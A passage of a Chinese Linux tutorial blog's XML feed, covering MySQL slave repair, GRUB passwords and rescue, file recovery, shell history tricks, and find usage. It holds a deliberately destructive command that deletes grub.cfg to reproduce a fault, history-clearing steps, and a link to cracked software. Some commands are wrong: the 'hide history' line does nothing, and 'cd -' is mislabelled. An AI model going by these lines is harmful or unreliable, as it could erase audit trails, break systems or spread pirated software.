operator">|</span> <span class="token number">0</span>Exec_Master_Log_Pos           <span class="token operator">|</span> <span class="token number">447</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span>Time: <span class="token number">0</span><span class="token punctuation">.</span>004s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、主从的修复"><a href="#三、主从的修复" class="headerlink" title="三、主从的修复"></a>三、主从的修复</h2><h3 id="重启-Slave"><a href="#重启-Slave" class="headerlink" title="重启 Slave"></a>重启 Slave</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">></span> stop slave<span class="token punctuation">;</span><span class="token operator">></span> <span class="token keyword">start</span> slave<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="查看-MySQL-日志"><a href="#查看-MySQL-日志" class="headerlink" title="查看 MySQL 日志"></a>查看 MySQL 日志</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /var/log/mysqld.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果以上的方法不成功，就只能重新作主从了。</p>]]></content>
      
      
      <categories>
          
          <category> 云计算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 高可用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 高级操作</title>
      <link href="/post/94ac57e3.html"/>
      <url>/post/94ac57e3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-高级操作"><a href="#Linux-高级操作" class="headerlink" title="Linux 高级操作"></a>Linux 高级操作</h1><h2 id="0x01-开机自动执行某个命令"><a href="#0x01-开机自动执行某个命令" class="headerlink" title="0x01 开机自动执行某个命令"></a>0x01 开机自动执行某个命令</h2><p>把需要执行的命令写入到：**/etc/rc.local** 中<br>​</p><h2 id="0x02-grub-加密"><a href="#0x02-grub-加密" class="headerlink" title="0x02 grub 加密"></a>0x02 grub 加密</h2><p>目的：给 grub 加密，不让别人通过 grub 进入单用户模式</p><h3 id="RHEL-6、CentOS-6"><a href="#RHEL-6、CentOS-6" class="headerlink" title="RHEL 6、CentOS 6"></a>RHEL 6、CentOS 6</h3><p>使用 <code>grub-md5-crypt</code> 命令生成密码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhel6 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># grub-md5-crypt</span>Password:Retype password:<span class="token variable">$1</span><span class="token variable">$ruj8a1</span><span class="token variable">$T0lsmfoMmORJ</span>.se7AKvUl1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>hiddenmenu</code> 下一行添加：<br><code>password --md5 $1$ruj8a1$T0lsmfoMmORJ.se7AKvUl1</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628069334881-bb8208c6-1656-4f4d-ab4f-466765fd4b42.png#clientId=u65c2b298-b3ee-4&amp;from=paste&amp;height=525&amp;id=udf78fb31&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=525&amp;originWidth=871&amp;originalType=binary%E2%88%B6=1&amp;size=235047&amp;status=done&amp;style=none&amp;taskId=u414f6371-0f51-41f6-9ed1-1e26068e374&amp;width=871" alt="image.png"></p><p>设置完成！<br>​</p><h3 id="RHEL-7、CentOS-7"><a href="#RHEL-7、CentOS-7" class="headerlink" title="RHEL 7、CentOS 7"></a>RHEL 7、CentOS 7</h3><p>使用 <code>grub2-mkpasswd-pbkdf2</code> 命令生成密码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhel01 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># grub2-mkpasswd-pbkdf2</span>Enter password:Reenter password:PBKDF2 <span class="token function">hash</span> of your password is grub.pbkdf2.sha512.10000.5E91E83A27E2C7963D35EF37D2084A4EA57D192014837AB880073C6A342776D4E5E2DEB8F4F7CA394E04E5226F964256F47F09B57E29135C77B26AB4C4CA17CA.C418BD2BA01F84FEEB682567ABB7F259E3188133FF634A04CE444DECB8579C088AC97ED2A2CFB8F45D5AD42A671FB8FB14361758A32A9C5116D419ABB00351D5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 <strong>/etc/grub.d/00_header</strong> 文件最后追加以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token operator">&lt;&lt;</span> <span class="token string">EOFset superusers='truda'password_pbkdf2 truda grub.pbkdf2.sha512.10000.5E91E83A27E2C7963D35EF37D2084A4EA57D192014837AB880073C6A342776D4E5E2DEB8F4F7CA394E04E5226F964256F47F09B57E29135C77B26AB4C4CA17CA.C418BD2BA01F84FEEB682567ABB7F259E3188133FF634A04CE444DECB8579C088AC97ED2A2CFB8F45D5AD42A671FB8FB14361758A32A9C5116D419ABB00351D5EOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-手动引导-Linux"><a href="#0x03-手动引导-Linux" class="headerlink" title="0x03 手动引导 Linux"></a>0x03 手动引导 Linux</h2><h3 id="GRUB-简介"><a href="#GRUB-简介" class="headerlink" title="GRUB 简介"></a>GRUB 简介</h3><p>GNU GRUB（GRand Unified Bootloader 简称“GRUB”）是一个来自 GNU 项目的多操作系统启动程序。GRUB 是多启动规范的实现，它允许用户可以在计算机内同时拥有多个操作系统，并在计算机启动时选择希望运行的操作系统。GRUB 可用于选择操作系统分区上的不同内核，也可用于向这些内核传递启动参数。<br>​</p><p>以下操作环境：Red Hat Enterprise Linux Server release 7.3<br>参考：<br><a href="https://www.linux.com/training-tutorials/how-rescue-non-booting-grub-2-linux/">如何在 Linux 上拯救无法启动的 GRUB 2</a><br><a href="https://medium.com/analytics-vidhya/rescuing-a-non-booting-grub-on-ubuntu-grub-rescue-4e10c9a4ff07">在 Ubuntu 上拯救一个无法启动的 GRUB</a><br>​</p><h3 id="故障重现"><a href="#故障重现" class="headerlink" title="故障重现"></a>故障重现</h3><p>查看系统信息并重现故障：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># lsb_release -a</span>LSB Version:    :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarchDistributor ID:    RedHatEnterpriseServerDescription:    Red Hat Enterprise Linux Server release 7.3 <span class="token punctuation">(</span>Maipo<span class="token punctuation">)</span>Release:    7.3Codename:    Maipo<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># df -h</span>Filesystem Size Used Avail Use% Mounted on/dev/mapper/rhel-root 50G 22G 29G 43% /devtmpfs 1.9G 0 1.9G 0% /devtmpfs 1.9G 88K 1.9G 1% /dev/shmtmpfs 1.9G 9.0M 1.9G 1% /runtmpfs 1.9G 0 1.9G 0% /sys/fs/cgroup/dev/sda1 1014M 174M 841M 18% /boot/dev/sr0 3.6G 3.6G 0 100% /media/cdrom/dev/mapper/rhel-home 46G 33M 46G 1% /hometmpfs 378M 8.0K 378M 1% /run/user/0<span class="token punctuation">[</span>root@localhost grub2<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># grub2-install -V</span>grub2-install <span class="token punctuation">(</span>GRUB<span class="token punctuation">)</span> 2.02~beta2<span class="token comment" spellcheck="true">#用grub2-install --version也可以查看grub版本信息</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ls /boot/grub2/</span>device.map fonts grub.cfg grubenv i386-pc locale themes<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># rm -rf /boot/grub2/grub.cfg</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>故障重现<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628127533273-e7c4f4a5-a448-4297-9e36-c9c0152ed96c.png#clientId=ued7665ec-d28d-4&amp;from=paste&amp;height=111&amp;id=u922239fe&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=111&amp;originWidth=634&amp;originalType=binary%E2%88%B6=1&amp;size=6539&amp;status=done&amp;style=none&amp;taskId=u6b7ddec9-a264-4059-b2ae-819d8c940d7&amp;width=634" alt="image.png"></p><h3 id="手动引导系统"><a href="#手动引导系统" class="headerlink" title="手动引导系统"></a>手动引导系统</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628127540624-f2d4d5d5-3538-487d-a49e-4f9d1f556c8b.png#clientId=ued7665ec-d28d-4&amp;from=paste&amp;height=278&amp;id=u8f836f5d&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=278&amp;originWidth=705&amp;originalType=binary%E2%88%B6=1&amp;size=20828&amp;status=done&amp;style=none&amp;taskId=ue8500e05-9928-456f-93ad-b6875992702&amp;width=705" alt="image.png"></p><h3 id="重装-grub"><a href="#重装-grub" class="headerlink" title="重装 grub"></a>重装 grub</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ls /boot/grub2/</span>device.map fonts grubenv i386-pc locale themes<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># grub2-mkconfig > /boot/grub2/grub.cfg</span>Generating grub configuration <span class="token function">file</span> <span class="token punctuation">..</span>.Found linux image: /boot/vmlinuz-3.10.0-514.el7.x86_64Found initrd image: /boot/initramfs-3.10.0-514.el7.x86_64.imgFound linux image: /boot/vmlinuz-0-rescue-f0bcb62b11a44643824cde1c7f3833e4Found initrd image: /boot/initramfs-0-rescue-f0bcb62b11a44643824cde1c7f3833e4.img<span class="token keyword">done</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ls /boot/grub2/</span>device.map fonts grub.cfg grubenv i386-pc locale themes<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重启验证修复结果"><a href="#重启验证修复结果" class="headerlink" title="重启验证修复结果"></a>重启验证修复结果</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628127562509-ea02653f-9652-4be8-9365-cac4d7c99ce9.png#clientId=ued7665ec-d28d-4&amp;from=paste&amp;height=459&amp;id=u67d4091b&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=459&amp;originWidth=541&amp;originalType=binary%E2%88%B6=1&amp;size=159061&amp;status=done&amp;style=none&amp;taskId=u7feff94f-fd7f-4532-a503-f0d75d2f7d9&amp;width=541" alt="image.png"><br>重启后能再次成功进入系统，说明修复成功！<br>​</p><h2 id="0x04-文件恢复工具"><a href="#0x04-文件恢复工具" class="headerlink" title="0x04 文件恢复工具"></a>0x04 文件恢复工具</h2><h3 id="Linux-误删文件恢复工具"><a href="#Linux-误删文件恢复工具" class="headerlink" title="Linux 误删文件恢复工具"></a>Linux 误删文件恢复工具</h3><ul><li>ext4 文件系统: <strong>extundelete</strong></li><li>ext3 文件系统：<strong>ext3grep</strong></li></ul><p>​</p><h3 id="可视化文件恢复工具"><a href="#可视化文件恢复工具" class="headerlink" title="可视化文件恢复工具"></a>可视化文件恢复工具</h3><ul><li>Windows 和 Mac OS：Disk Drill（<a href="https://www.macwk.com/soft/disk-drill">Mac OS Disk Drill 中文破解版</a>）</li></ul><p>​</p><h2 id="0x05-去除配置文件注释行"><a href="#0x05-去除配置文件注释行" class="headerlink" title="0x05 去除配置文件注释行"></a>0x05 去除配置文件注释行</h2><h3 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> test.conf test.conf.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="去除注释和空白行"><a href="#去除注释和空白行" class="headerlink" title="去除注释和空白行"></a>去除注释和空白行</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> test.conf.bak <span class="token operator">|</span> <span class="token function">grep</span> -v -e <span class="token string">'^#'</span> -e <span class="token string">'^ *#'</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^$/d'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x06-Linux-history-操作"><a href="#0x06-Linux-history-操作" class="headerlink" title="0x06 Linux history 操作"></a>0x06 Linux history 操作</h2><h3 id="隐藏终端-history-记录"><a href="#隐藏终端-history-记录" class="headerlink" title="隐藏终端 history 记录"></a>隐藏终端 history 记录</h3><p>执行以下命令后将不再记录历史命令，对当前用户有效，重启失效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"No History For This"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="让-history-显示时间轴"><a href="#让-history-显示时间轴" class="headerlink" title="让 history 显示时间轴"></a>让 history 显示时间轴</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> HISTTIMEFORMAT<span class="token operator">=</span><span class="token string">'%F %T '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="清空-history"><a href="#清空-history" class="headerlink" title="清空 history"></a>清空 history</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">history</span> -c<span class="token function">cat</span> /dev/null <span class="token operator">></span> ~/.bash_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="设置永久不记录"><a href="#设置永久不记录" class="headerlink" title="设置永久不记录"></a>设置永久不记录</h3><p>编辑 <strong>/etc/profile</strong>，将 <code>HISTSIZE=1000</code> 改成 <code>0</code> 或 <code>1</code></p><h2 id="0x07-终端命令技巧"><a href="#0x07-终端命令技巧" class="headerlink" title="0x07 终端命令技巧"></a>0x07 终端命令技巧</h2><h3 id="交互式输入"><a href="#交互式输入" class="headerlink" title="交互式输入"></a>交互式输入</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 shell<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat > test.txt &lt;&lt; EOF</span><span class="token operator">></span> 123<span class="token operator">></span> 456<span class="token operator">></span> EOF<span class="token punctuation">[</span>root@centos7 shell<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat test.txt</span>123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用-重用上次的命令"><a href="#使用-重用上次的命令" class="headerlink" title="使用 !! 重用上次的命令"></a>使用 !! 重用上次的命令</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> /<span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="使用-n-重用第-n-条命令"><a href="#使用-n-重用第-n-条命令" class="headerlink" title="使用 !n 重用第 n 条命令"></a>使用 !n 重用第 n 条命令</h3><p>使用 <code>history</code> 查看命令编号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 /<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># history</span>    1  <span class="token function">cat</span> ~/.bash_history    2  <span class="token function">cat</span> ~/.bash_profile    3  <span class="token function">cat</span> ~/.bash_logout    4  <span class="token function">clear</span>    5  <span class="token function">ls</span>    6  <span class="token function">pwd</span><span class="token punctuation">[</span>root@centos7 /<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># !5</span><span class="token function">ls</span>bin   dev  home  lib64  mnt  proc  run   srv  tmp  varboot  etc  lib   media  opt  root  sbin  sys  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用-重用上次命令中的参数"><a href="#使用-重用上次命令中的参数" class="headerlink" title="使用 !$ 重用上次命令中的参数"></a>使用 !$ 重用上次命令中的参数</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> Test/<span class="token function">cd</span> <span class="token operator">!</span>$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="使用-获取上一个命令的执行结果"><a href="#使用-获取上一个命令的执行结果" class="headerlink" title="使用 $? 获取上一个命令的执行结果"></a>使用 $? 获取上一个命令的执行结果</h3><p><strong>$?</strong> 结果为 0 表示 ✅</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status httpd<span class="token keyword">echo</span> <span class="token variable">$?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="重新运行最后一个终端命令"><a href="#重新运行最后一个终端命令" class="headerlink" title="重新运行最后一个终端命令"></a>重新运行最后一个终端命令</h3><p>使用 <strong>sudo</strong> 运行最后一个命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="切换文件路径的快捷方式"><a href="#切换文件路径的快捷方式" class="headerlink" title="切换文件路径的快捷方式"></a>切换文件路径的快捷方式</h3><table><thead><tr><th><strong>命令</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>cd ../</td><td>上移一个目录</td></tr><tr><td>cd ~</td><td>移动到用户的主目录</td></tr><tr><td>cd /</td><td>移动到根目录</td></tr><tr><td>cd -</td><td>移动到用户的主目录</td></tr><tr><td>cd</td><td>移动到用户的主目录</td></tr></tbody></table><h3 id="将终端会话记录为文件"><a href="#将终端会话记录为文件" class="headerlink" title="将终端会话记录为文件"></a>将终端会话记录为文件</h3><p>有时您可能希望将所有终端输出存储在一个文件中，稍后您可以参考该文件，而“<strong>script</strong>”命令可以让您做到这一点。它会在您的终端会话中创建所有内容的日志文件中。终端数据以原始形式存储在日志文件中，有关计时的信息存储在另一个（可选）结构化日志文件中。<br>要开始录制，您只需在终端中输入以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash">$ script<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要停止录制，输入：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token keyword">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退出后，您应该在<strong>script</strong>启动的目录中找到一个名为“<strong>typescript</strong>”的文件，并将其打印到终端，您可以看到您在终端上输入的所有内容，包括它们的输出！<br>​</p><h2 id="0x08-重命名-移动带后缀的文件"><a href="#0x08-重命名-移动带后缀的文件" class="headerlink" title="0x08 重命名/移动带后缀的文件"></a>0x08 重命名/移动带后缀的文件</h2><p>如果你想通过给它们添加后缀来快速重命名某些文件，可以使用以下语法：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">ls</span>result.txt$ <span class="token function">cp</span> ./result.txt<span class="token punctuation">{</span>,.bak<span class="token punctuation">}</span>$ <span class="token function">ls</span>result.txt result.txt.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合一些正则表达式，这会非常方便，尤其是在重命名大量文件时。<br>​</p><h2 id="0x09-Bash-常用快捷键"><a href="#0x09-Bash-常用快捷键" class="headerlink" title="0x09 Bash 常用快捷键"></a>0x09 Bash 常用快捷键</h2><table><thead><tr><th><strong>快捷键</strong></th><th><strong>作 用</strong></th></tr></thead><tbody><tr><td>Ctrl+A</td><td>把光标移动到命令行开头。如果我们输入的命令过长，则在想要把光标移动到命令行开头时使用</td></tr><tr><td>Ctrl+E</td><td>把光标移动到命令行结尾</td></tr><tr><td>Ctrl+C</td><td>强制中止当前的命令</td></tr><tr><td>Ctrl+L</td><td>淸屏，相当于 clear 命令</td></tr><tr><td>Ctrl+U</td><td>刪除或剪切光标之前的命令。假设输入了一行很长的命令，无须使用退格键一个一个字符地刪除， 使用这个快捷键会更加方便</td></tr><tr><td>Ctrl+K</td><td>删除或剪切光标之后的内容</td></tr><tr><td>Qrl+Y</td><td>粘贴 Ctrl+U 或 Ctrl+K 剪切的内容</td></tr><tr><td>Ctrl+R</td><td>在历史命令中搜索，按下 Ctrl+R 组合键之后，就会出现搜索界面，只要输入搜索内容，就会从历史命令中搜索</td></tr><tr><td>Ctrl+D</td><td>退出当前终端</td></tr><tr><td>Ctrl+Z</td><td>暂停，并放入后台。这个快捷键涉及工作管理的内容，我们会在后续中详细介绍</td></tr><tr><td>Ctrl+S</td><td>暂停屏幕输出</td></tr><tr><td>Ctrl+Q</td><td>恢复屏幕输出</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文本处理</title>
      <link href="/post/9f04c795.html"/>
      <url>/post/9f04c795.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-文本处理"><a href="#Linux-文本处理" class="headerlink" title="Linux 文本处理"></a>Linux 文本处理</h1><h2 id="一、find-文件查找"><a href="#一、find-文件查找" class="headerlink" title="一、find 文件查找"></a>一、find 文件查找</h2><h3 id="基本查找"><a href="#基本查找" class="headerlink" title="基本查找"></a>基本查找</h3><p>查找**.txt<strong>和</strong>.pdf**文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> \<span class="token punctuation">(</span> -name <span class="token string">"*.txt"</span> -o -name <span class="token string">"*.pdf"</span> \<span class="token punctuation">)</span> -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>正则方式查找**.txt<strong>和</strong>.pdf**文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -regex <span class="token string">".*.[txt|pdf]$"</span> -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>-iregex： 忽略大小写的正则</p></blockquote><p>​</p><p>否定参数，查找所有非 <strong>.txt</strong> 文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> <span class="token operator">!</span> -name <span class="token string">"*.txt"</span> -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>指定<strong>搜索深度</strong>，打印出当前目录的文件（深度为 1）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -maxdepth 1 -type f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="定制搜索"><a href="#定制搜索" class="headerlink" title="定制搜索"></a>定制搜索</h3><h4 id="按类型搜索"><a href="#按类型搜索" class="headerlink" title="按类型搜索"></a>按类型搜索</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -print  // 只列出所有文件<span class="token function">find</span> <span class="token keyword">.</span> -type d -print  // 只列出所有目录<span class="token function">find</span> <span class="token keyword">.</span> -type l -print  // 只列出所有符号链接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>-type f 文件 / l 符号链接 / d 目录</p></blockquote><p>​</p><p>find 支持的文件检索类型可以区分普通文件和符号链接、目录等，但是二进制文件和文本文件无法直接通过 find 的类型区分出来；<br>file 命令可以检查文件具体类型（二进制或文本）:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># file /bin/vim</span>/bin/vim: ELF 64-bit LSB executable, x86-64, version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked <span class="token punctuation">(</span>uses shared libs<span class="token punctuation">)</span>, <span class="token keyword">for</span> GNU/Linux 2.6.32, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>70d3b3bb75c8d735239f78142d00686c8a6a53dd, stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以，可以用以下命令组合来实现查找本地目录下的<strong>所有二进制文件</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -lrt <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$9</span>}'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">file</span><span class="token operator">|</span><span class="token function">grep</span> ELF<span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$1</span>}'</span><span class="token operator">|</span><span class="token function">tr</span> -d <span class="token string">':'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="按时间搜索"><a href="#按时间搜索" class="headerlink" title="按时间搜索"></a>按时间搜索</h4><ul><li>-atime 访问时间（单位是天，分钟单位则是 amin，以下类似）</li><li>mtime 修改时间（内容最后被修改的时间）</li><li>ctime 变化时间（元数据或权限变化）</li></ul><p><strong>最近第 7 天</strong>被访问过的所有文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -atime 7 -type f -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p><strong>最近 7 天</strong>被访问过的所有文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -atime -7 -type f -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>查询<strong>7 天前</strong>被访问过的所有文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -atime +7 <span class="token function">type</span> f -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="按大小搜索"><a href="#按大小搜索" class="headerlink" title="按大小搜索"></a>按大小搜索</h4><p>寻找<strong>大于 2k</strong>的文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -size +2k<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="按权限查找"><a href="#按权限查找" class="headerlink" title="按权限查找"></a>按权限查找</h4><p>查找<strong>权限为 644</strong>的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -perm 644 -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="按用户查找"><a href="#按用户查找" class="headerlink" title="按用户查找"></a>按用户查找</h4><p>查找<strong>用户 truda</strong>所拥有的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -user truda -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="找到后的后续操作"><a href="#找到后的后续操作" class="headerlink" title="找到后的后续操作"></a>找到后的后续操作</h3><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p><strong>删除</strong>当前目录下的所有<strong>txt 文件</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -name <span class="token string">"*.txt"</span> -delete<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另一种语法：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> <span class="token function">type</span> f -name <span class="token string">"*.txt"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">rm</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="执行动作（exec）"><a href="#执行动作（exec）" class="headerlink" title="执行动作（exec）"></a>执行动作（exec）</h4><p>将当前目录下所有权为 root 的文件变更所有权为 truda：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -user root -exec <span class="token function">chown</span> truda <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注：<code>{}</code>是一个特殊的字符串，对于每一个匹配的文件，<code>{}</code>会被替换成相应的文件名；</p></blockquote><p>将找到的文件全部 copy 到另一个目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -mtime +10 -name <span class="token string">"*.txt"</span> -exec <span class="token function">cp</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> OLD \<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="结合多个命令"><a href="#结合多个命令" class="headerlink" title="结合多个命令"></a>结合多个命令</h4><p>如果需要后续执行多个命令，可以将多个命令写成一个脚本，然后 -exec 调用时执行脚本即可：</p><pre class="line-numbers language-bash"><code class="language-bash">-exec ./commands.sh <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span 